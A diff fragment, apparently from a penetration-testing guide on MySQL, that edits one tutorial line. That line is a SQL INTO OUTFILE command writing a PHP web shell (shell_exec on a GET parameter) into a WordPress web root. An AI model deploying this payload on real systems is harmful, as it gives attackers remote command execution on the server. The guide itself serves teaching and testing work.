@@ -292,7 +292,7 @@ Now, as for demo purposes, let's imagine that `MySQL` operates on a PHP-based w
  
 ```mysql
 # Browse to the location where the file is and execute the commands.
- SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/wordpress/webshell.php';
 ```
 
 ### Reading files
